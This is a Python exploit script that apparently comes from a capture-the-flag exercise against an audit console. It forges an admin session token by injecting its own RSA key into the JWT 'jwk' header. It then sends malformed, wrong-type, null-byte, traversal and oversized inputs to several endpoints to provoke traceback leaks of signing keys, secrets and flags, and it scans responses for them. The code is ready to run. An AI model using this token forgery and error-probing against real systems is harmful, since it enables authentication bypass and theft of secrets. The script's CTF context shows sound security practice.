#!/usr/bin/env python3
"""ACT 4 EV-037 — force error/traceback info-leaks (admin via jwk forge).
If the console leaks a Werkzeug traceback / debug output, it may reveal the
X-Nightfall-Hub-Signature scheme or key, SECRET, or source paths. Send malformed
/ wrong-type inputs across endpoints and scan responses for key material."""
import re, json, base64
import requests, urllib3
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import hashes
urllib3.disable_warnings()
A="https://audit.hackthe.website"
FLAG=re.compile(r'dome\.ctf\{[^}]+\}'); flags=set()
LEAK=re.compile(r'(Traceback|Werkzeug|File ".*", line|HUB|SIGNING|SIGNATURE|SECRET|hmac|compute_sig|computeSig|/app/|\.py["\s:]|visibility|research[-_ ]?agent|dome\.ctf)', re.I)
def b64u_dec(s): return base64.urlsafe_b64decode(s+"="*(-len(s)%4))
def b64u(b):
    if isinstance(b,str): b=b.encode()
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()
def jseg(o): return b64u(json.dumps(o,separators=(",",":")).encode())
def int_b64u(x): return b64u(x.to_bytes((x.bit_length()+7)//8,"big"))
def look(label, r):
    for m in FLAG.finditer(r.text):
        if m.group() not in flags: flags.add(m.group()); print(f"   *** FLAG [{label}]: {m.group()} ***")
    if r.status_code>=500 or LEAK.search(r.text):
        print(f"  [{r.status_code}] {label} <<"); print("    "+r.text[:600].replace("\n","\n    "))
    else:
        print(f"  [{r.status_code}] {label}")

s=requests.Session(); s.verify=False; s.headers.update({"User-Agent":"Mozilla/5.0","Content-Type":"application/json"})
s.post(f"{A}/api/v1/auth/login", json={"username":"svc-probe","password":"x"}, timeout=15)
p0=json.loads(b64u_dec(s.cookies.get("console_session").split(".")[1]))
priv=rsa.generate_private_key(public_exponent=65537,key_size=2048); pn=priv.public_key().public_numbers()
myjwk={"kty":"RSA","n":int_b64u(pn.n),"e":int_b64u(pn.e),"alg":"RS256","use":"sig","kid":"console-2026"}
h={"alg":"RS256","typ":"JWT","kid":"console-2026","jwk":myjwk}
pl=dict(p0); pl.update({"sub":"admin","role":"admin","scope":"console:basic audit:read audit:export finance:audit finance:read admin","exp":4102444800,"iat":1600000000})
tok=jseg(h)+"."+jseg(pl); tok=tok+"."+b64u(priv.sign(tok.encode(),padding.PKCS1v15(),hashes.SHA256()))
adm=requests.Session(); adm.verify=False; adm.headers.update({"User-Agent":"Mozilla/5.0"})
adm.cookies.set("console_session", tok, domain="audit.hackthe.website")
TX="TX-9f2b6a1e4c7d8035"

print("--- transactions: wrong-type / malformed 'view' ---")
for v in ['"string"','123','true','null','[1,2]','{"audit":{"nested":1}}','{"audit":[1]}',
          '{"audit":"yes"}','{"__proto__":1}','{"audit":1e999}']:
    try:
        r=adm.post(f"{A}/api/v1/transactions/{TX}", data='{"view":'+v+'}',
                   headers={"Content-Type":"application/json"}, timeout=10)
        look(f"view={v}", r)
    except Exception as e: print("  err",v,type(e).__name__)
# malformed json / wrong content-type
for raw,ct in [("{bad json", "application/json"), ("view=summary","application/x-www-form-urlencoded"),
               ("", "application/json"), ("[]","application/json"), ("{\"view\":{}}","text/plain")]:
    try:
        r=adm.post(f"{A}/api/v1/transactions/{TX}", data=raw, headers={"Content-Type":ct}, timeout=10)
        look(f"raw={raw[:20]!r} ct={ct}", r)
    except Exception as e: print("  err",type(e).__name__)
# missing/odd id chars that might error server-side
for idv in [TX+"\x00", "%00", TX+"%0a", "../"+TX, TX+"%27", "💥"]:
    try:
        r=adm.post(f"{A}/api/v1/transactions/{idv}", json={"view":{"audit":True}}, timeout=10)
        look(f"id={idv!r}", r)
    except Exception as e: print("  err id",type(e).__name__)

print("\n--- export-job: malformed bodies/headers ---")
for raw,hdr in [("{bad",{"X-Nightfall-Hub-Signature":"ab"}),
                ('{"job_metadata":123}',{"X-Nightfall-Hub-Signature":"ab"}),
                ('{"job_metadata":"!!!notb64!!!"}',{"X-Nightfall-Hub-Signature":"ab"}),
                ('{"job_metadata":null}',{"X-Nightfall-Hub-Signature":"ab"}),
                ('{}',{"X-Nightfall-Hub-Signature":"ab"}),
                ('{"job_metadata":"'+("A"*100000)+'"}',{"X-Nightfall-Hub-Signature":"ab"})]:
    try:
        r=adm.post(f"{A}/api/internal/export-job", data=raw, headers={**hdr,"Content-Type":"application/json"}, timeout=15)
        look(f"ejob raw={raw[:24]!r}", r)
    except Exception as e: print("  err",type(e).__name__)

print("\n--- search: wrong types / arrays / huge ---")
for params in [{"filter":["a","b"]},{"filter":{"x":1}},{"nofilter":"x"},{"filter":"A"*50000},{"filter":"\x00"}]:
    try:
        r=adm.get(f"{A}/api/v1/audit/search", params=params, timeout=12); look(f"search {str(params)[:30]}", r)
    except Exception as e: print("  err",type(e).__name__)
# whoami/recent with junk cookie to force decode errors
for ck in ["notajwt","a.b.c","..",tok[:-5]]:
    js=requests.Session(); js.verify=False; js.cookies.set("console_session",ck,domain="audit.hackthe.website")
    try: look(f"whoami ck={ck[:12]!r}", js.get(f"{A}/api/v1/auth/whoami", timeout=10))
    except Exception as e: print("  err",type(e).__name__)

print("\nFLAGS:", sorted(flags) or "(none yet)")
